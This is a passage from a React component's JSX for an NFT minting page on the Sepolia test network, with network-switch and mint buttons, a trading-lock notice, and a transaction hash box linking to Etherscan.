                      )}
                      {!isSepolia && (
                        <button
                          className="btnSecondary"
                          style={{ padding: "0 10px", marginLeft: 8, height: 34 }}
                          onClick={switchToSepolia}
                        >
                          Switch to Sepolia
                        </button>
                      )}
                    </div>
                  </div>
                </div>

                <button
                  className={`primaryCta ${account ? "" : "notBold"}`}
                  onClick={account ? buy : connect}
                  disabled={account ? !canMint : status === "sending"}
                >
                  {account ? (status === "sending" ? "Confirming…" : "Mint") : "Log In to mint"}
                </button>

                <div className="noticeLock">
                  <span style={{ color: "rgb(var(--brand) / .90)" }}>🔒</span>
                  <span>Collection is locked from trading until all items have been minted.</span>
                </div>

                {txHash && (
                  <div className="txBox">
                    <div>
                      Tx: <span style={{ fontFamily: "var(--mono)" }}>{shortAddr(txHash)}</span>
                    </div>
                    <a
                      href={`https://sepolia.etherscan.io/tx/${txHash}`}
                      target="_blank"
                      rel="noreferrer"
                    >
                      View on Etherscan →
                    </a>
                  </div>
                )}

                {error && <div className="err">{error}</div>}
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
